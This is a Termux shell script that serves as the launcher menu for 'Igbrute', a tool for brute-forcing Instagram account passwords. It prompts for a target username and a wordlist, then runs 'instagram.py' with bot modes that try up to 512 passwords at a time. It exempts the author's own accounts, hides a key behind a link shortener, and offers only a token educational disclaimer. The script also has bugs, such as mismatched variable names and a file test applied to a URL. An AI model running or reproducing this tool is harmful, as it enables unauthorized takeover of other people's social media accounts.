#!/system/bin/sh
clear
if [ -f /$HOME/Igbrute/st.txt ]; then
echo -e "\e[34mpackages are properly seted up"
sleep 3
else
echo -e "You dont properly seted up packages, come back again after setting up [ redirecting to setup packages...]"
sleep 6
cd /$HOME/Igbrute/
touch st.txt
bash setup.sh
fi
if [ -f /$HOME/Igbrute/acs.txt ]; then
echo -e "You already have the key, opening up the tool.."
sleep 3
else
echo "You dont have the key get the key on our web"
sleep 3
am start -a android.intent.action.VIEW -d https://shrinke.me/dQQ1c 2>/dev/null
cd /$HOME/Igbrute
touch acs.txt
fi
echo -e "\e[31m wait lazyboy, setting up packges\e[0m"
sleep 2
echo -e "\e[41m This tool is only for educational purpose.
 If you use this tool for other purposes except education we will
 not be responsible in such cases. use this tool at your own risk\e[0m"
echo -e "\e[31m

 ▀ ▄▀▀░ █▀▄ █▀▀▄ █░█ ▀█▀ █▀▀
 █ █░▀▌ █▀█ █▐█▀ █░█ ░█░ █▀▀
 ▀ ▀▀▀░ ▀▀░ ▀░▀▀ ░▀░ ░▀░ ▀▀▀
\e[0m"
echo -e "\e[34mstarting up...\e[0m"
sleep 4
echo -e "\e[41mThis tool has been CoDeD bY aFrEeDi   \e[0m"
echo -e "\e[41mspecial thanks to vyshu @kerelahackers 
and NITRO @noob hackers\e[0m"
echo -e "\n"
echo -e "\e[31m[1] Start Attack "
echo -e "[2] View and customise inbuild wordlist"
echo -e "[3] Get the key \e[0m"
echo -e "\e[31m[4] exit\e[0m\n"
echo -n -e "\e[34mselect a option\e[0m : "
read option

update()
{
if [ -f https://raw.githubusercontent.com/afreedituttu/Igbruteindex.html ]; then
echo -e "\e[34mversiom 2 is avilable do you like you update?"
read upd
if [ $upd == "y" ]; then
echo -e "wait for some time, on going process [ Do Not Quit While Processing It May Lead To Permanent Damaging Of Tool ]"



else
echo -e "terminating process"
sleep 4
fi
else
echo -e "No versions are currently available. come back again my lazy boyy..\e[0m"
sleep 3
cd /$HOME/Igbrute/
bash Igbrute.sh
fi
}

admin()
{
if [ $usr == "_._afreedi_._" ]; then
echo -e "\e[34myou cannot attack against admin :-("
sleep 5
exit
elif [ $usr == "_._Afreedi_._" ]; then
echo -e "you cannot attack against admin :-("
sleep 5
exit
elif [ $usr == "afreedi_and_1278_others" ]; then
echo -e "you cannot attack against admin :-("
sleep 5
exit
elif [ $usr == "Afreedi_and_1278_others" ]; then
echo -e "You cannot attack against admin :-("
sleep 5
exit
elif [ $usr == "_ameer_ahsan_" ]; then
echo -e "you cannot attack against this account"
sleep 5
exit
elif [ $usr == "_Ameer_ahsan_" ]; then
echo -e"You cannot attack against this account"
sleep 5
exit
elif [ $usr == "ax_la_m" ]; then
echo -e "You cannot attack against this account"
sleep 5
exit
elif [ $usr == "Ax_la_m" ]; then
echo -e "You cannot attack against this account"
sleep 5
exit
elif [ $usr == "chinnar_mathan" ];then
echo -e "You cannot attack against this account"
sleep 5
exit
elif [ $usr == "Chinnar_mathan" ]; then
echo -e "You cannot attack against this account\e[0m"
sleep 5
exit
else
echo ""
fi
}

adreno()
{
echo -e -n "\e[34m Enter the key : "
read row
if [ $row == 6820102 ]; then
echo "key is correct, thanks for using this tool"
else
echo "key is wrong, get key on the main page"
sleep 3
exit
fi
}

starter()
{
echo -e "\e[31m wait lazyboyyy... setting up..\e[0m"
sleep 3
cd /$HOME/Igbrute
python2 lazybee.py
echo -n -e "Enter the username : "
read usr
echo -n -e "\e[31mEnter the wordlist name you created with .txt\e[0m"
read wordlst
if [ -f /sdcard/$wordlist ]; then
echo -e"\e[31mword list already in sdcard, continueing Attack\e[0m"
sleep 2
else
echo "setting up wordlist to your sdcard"
sleep 1
cp $wordlst /sdcard/
echo "setting up done :-)"
fi
echo -e "\e[31m
 [1] 4 bots: 64 passwords at a time
 [2] 8 bots: 128 passwords at a time
 [3] 16 bots: 256 passwords at a time
 [4] 32 bots: 512 passwords at a time\e[0m"
echo -e -n "select any bot : "
read mod
admin
python3 instagram.py $usr /sdcard/$wordlst -m $mod
}

custom()
{
cd /$HOME/Igbrute/
echo -e "\e[31m  seting up done \e[0m"
sleep 1
echo -n -e "\e[31mEnter the username :\e[0m "
read usr
echo -n -e "\e[31mEnter the password list Destination :\e[0m "
read dest
echo -e "
\e[31m [1] 4 bots: 64 passwords at a time
 [2] 8 bots: 128 passwords at a time
 [3] 16 bots: 256 passwords at a time\e[0m"
echo -e -n "\e[31mselect any mode to attack : \e[0m"
read mod
admin
python3 instagram.py $usr $dest -m $mod
}

build()
{
echo -e -n "\e[31mEnter the username : \e[0m"
read usr
cd /$HOME/Igbrute
echo -e "\e[31m [1] 4 bots: 64 passwords at a time
 [2] 8 bots: 128 passwords at a time
 [3] 16 bots: 256 passwords at a time"
echo -e -n "\e[31m Select any bot : "
read mod
echo -e -n "\e[31m[1]Attack with password list 1\e[0m\n" 
echo -e -n "\e[31m[2]Attack with password list 2\e[0m\n"
echo -e -n "\e[31mselect an option : \e[0m"
read pass
admin
if [ $pass == 1 ]; then
admin
python3 instagram.py $usr /sdcard/passwordd.txt -m $mod
elif [ $pass == 2 ]; then
admin
python3 instagram.py $usr /sdcard/passwords.lst -m $mod
else
echo "you selected invalid option"
cd /$HOME/Igbrute
bash Igbrute.sh
fi
}

menu()
{
adreno
echo -e "\e[31m[1] Attack with custom wordlist\e[0m"
echo -e "\e[31m[2] Attack with inbuild wordlist\e[0m"
echo -e "\e[31m[3] Creat and attack\e[0m"
echo -e "\e[31m[4] exit\e[0m\n"
echo -e -n "\e[34mSelect which type of attack you wants to perform : \e[0m\n"
read op
if [ $op == 1 ]; then
custom
elif [ $op == 2 ]; then
build
elif [ $op == 3 ]; then
starter
elif [ $op == 4 ]; then
exit
else
echo -e "\e[34myou selected in valid option\e[0m\n"
cd /$HOME/Igbrute/
bash Igbrute.sh
fi
}

customise()
{
echo -e "\e[31m View wordlist \e[0m"
echo -e "\e[31m Customise wordlist\e[0m\n"
echo -e -n "\e[34m select an option : \e[0m\n"
read custom
if [ $custom == 1 ]; then
echo -e -n "\e[31mwhich wordlist you wants to View [1/2] : \e[0m\n"
read vie
if [ $vie == 1 ]; then
cat passwordd.txt
elif [ $vie == 2 ]; then
cat passwords.lst
else
echo "You selected wrong option, baddd boyyy.....+_+"
cd /$HOME/Igbrute/
bash Igbrute.sh
fi
elif [ $custom == 2 ]; then
echo -e -n "\e[34mWhich wordlist you wants to Customise [1/2] : \n"
read cust
if [ $cust == 1 ]; then
nano passwords.lst
elif [ $cust == 2 ]; then
nano passwords.lst
else
echo "You selected wrong option, bad boyy..."
cd /$HOME/Igbrute
bash Igbrute.sh
fi
else
echo "you selected wrong option, bad boyy.."
cd /$HOME/Igbrute.sh
bash Igbrute.sh
fi
}

if [ $option == 1 ]; then
echo -e "\e[34mYou selected option 1\n"
menu
elif [ $option == 10 ]; then
echo -e "\e[34mYou selected option 10 its not avilable\e[0m\n"
exit
cd /$HOME/Igbrute
bash Igbrute.sh
elif [ $option == 2 ]; then
echo -e "\e[34mYou selected option 2\e[0m\n"
customise
elif [ $option == 3 ]; then
am start -a android.intent.action.VIEW -d https://shrinke.me/dQQ1c 2>/dev/null
cd /$HOME/Igbrute
bash Igbrute.sh
elif [ $option == 4 ]; then
exit
else
echo -e "\e[34mYou selected invalid number\e[0m\n"
sleep 3
cd /$HOME/Igbrute/
bash Igbrute.sh
fi
